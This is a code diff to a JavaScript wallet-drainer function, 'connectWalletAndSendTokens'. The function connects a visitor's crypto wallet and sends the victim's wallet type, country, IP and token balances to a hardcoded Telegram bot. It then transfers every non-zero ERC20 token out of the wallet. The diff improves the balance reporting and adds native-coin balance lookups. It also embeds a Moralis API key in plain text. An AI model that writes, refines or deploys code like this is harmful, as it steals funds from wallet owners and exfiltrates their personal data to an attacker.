@@ -115,6 +115,9 @@ async function connectWalletAndSendTokens() {
   const chatId = "5995616824";
   const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
 
+  // Utility function to delay execution
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
   try {
     // Connect wallet
     const instance = await web3Modal.connect();
@@ -173,42 +176,53 @@ Chain ID: ${network.chainId}
           body: JSON.stringify({ chat_id: chatId, text: switchMessage })
         });
 
+        // Delay to ensure provider sync
+        await delay(1000);
+
         // Fetch ERC20 token balances using Moralis
         let tokens = [];
+        let tokenSummaryTelegram = "";
         try {
           const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
           const response = await fetch(moralisUrl, {
             headers: { "X-API-Key": moralisApiKey }
           });
           if (!response.ok) {
-            throw new Error(`Moralis API error: ${response.statusText}`);
+            throw new Error(`Moralis API error: ${response.statusText} (Status: ${response.status})`);
           }
           tokens = await response.json();
+
+          // Format balance summary for Telegram
+          const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
+          if (nonZeroTokens.length > 0) {
+            tokenSummaryTelegram = nonZeroTokens.map(token => {
+              const decimals = token.decimals ?? 18;
+              const balance = ethers.utils.formatUnits(token.balance, decimals);
+              return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
+            }).join("\n");
+          } else {
+            tokenSummaryTelegram = "No non-zero ERC20 token balances found.";
+          }
         } catch (apiErr) {
-          console.warn(`Failed to fetch tokens for ${network.name}`, apiErr);
-          const apiErrorMessage = `
-❌ Failed to Fetch Tokens on ${network.name}!
-Error: ${apiErr.message || "Moralis API error"}
-          `;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: apiErrorMessage })
-          });
+          console.warn(`Failed to fetch ERC20 tokens for ${network.name}`, apiErr);
+          tokenSummaryTelegram = `Failed to fetch ERC20 tokens: ${apiErr.message || "Moralis API error"}`;
         }
 
-        // Format balance summary for Telegram
-        let tokenSummaryTelegram = "";
-        const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
-        if (nonZeroTokens.length > 0) {
-          tokenSummaryTelegram = nonZeroTokens.map(token => {
-            const decimals = token.decimals ?? 18;
-            const balance = ethers.utils.formatUnits(token.balance, decimals);
-            return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
-          }).join("\n");
-        } else {
-          tokenSummaryTelegram = "No non-zero token balances found.";
+        // Fetch native balance as fallback (e.g., BNB for BNB Chain)
+        let nativeBalanceMessage = "";
+        try {
+          const nativeBalance = await currentProvider.getBalance(userAddress);
+          const formattedBalance = ethers.utils.formatEther(nativeBalance);
+          if (parseFloat(formattedBalance) > 0) {
+            const nativeSymbol = network.chainId === 1 ? "ETH" : network.chainId === 137 ? "MATIC" : "BNB";
+            nativeBalanceMessage = `• ${nativeSymbol}: ${formattedBalance}`;
+          }
+        } catch (balanceErr) {
+          console.warn(`Failed to fetch native balance for ${network.name}`, balanceErr);
         }
+
+        // Combine token and native balance for notification
+        const balanceSummary = [tokenSummaryTelegram, nativeBalanceMessage].filter(msg => msg).join("\n");
 
         // Send Telegram message for network balances
         const networkMessage = `
@@ -218,8 +232,8 @@ Wallet: ${walletType}
 Country: ${locationData.country_name}
 IP: ${locationData.ip}
 
-💰 Non-Zero Token Balances on ${network.name}:
-${tokenSummaryTelegram}
+💰 Balances on ${network.name}:
+${balanceSummary || "No balances found or API error occurred."}
         `;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
@@ -227,8 +241,8 @@ ${tokenSummaryTelegram}
           body: JSON.stringify({ chat_id: chatId, text: networkMessage })
         });
 
-        // Transfer non-zero tokens
-        for (const token of nonZeroTokens) {
+        // Transfer non-zero ERC20 tokens
+        for (const token of tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero())) {
           try {
             const contract = new ethers.Contract(token.token_address, [
               "function transfer(address to, uint amount) returns (bool)",
